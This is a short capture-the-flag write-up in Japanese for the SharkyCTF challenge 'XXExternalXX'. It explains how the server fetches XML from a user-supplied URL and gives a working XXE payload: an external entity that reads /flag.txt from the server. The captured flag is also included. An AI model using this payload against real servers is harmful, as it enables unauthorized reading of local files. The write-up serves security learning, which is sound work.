# XXExternalXX

```
One of your customer all proud of his new platform asked you to audit it. To show him that you can get information on his server, he hid a file "flag.txt" at the server's root.

xxexternalxx.sharkyctf.xyz

Creator : Remsio
```

## 調査

アクセスすると`Home`と`Show stored data`のリンク。`Home`は`/`に、`Show stored data`は`/?xml=data.xml`に遷移する。  
`xml=適当なurl`に書き換えると、画面では特に変化はないがサーバ側にはアクセスされたログがある。

指定したファイル名かURLが正しい形式のxmlだったら表示されているのかなくらいの予想がつく。  
xmlの形式がわからなくて詰まったが、適当に散策していると`/data.xml`で`data.xml`がみれることに気づいた。

```
<root>
	<data>
		17/09/2019 the platform is now online, the fonctionnalities it contains will be audited by one of our society partenairs
	</data>
</root>
```


後はやるだけ。

## 解

```xml:index.xml
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE foo [
<!ENTITY flag SYSTEM "/flag.txt">
]>
<root>
    <data>&flag;</data>
</root>
```

上のxmlを公開し、`?xml=[url]`にアクセスするとflagが手に入る。

`shkCTF{G3T_XX3D_f5ba4f9f9c9e0f41dd9df266b391447a}`
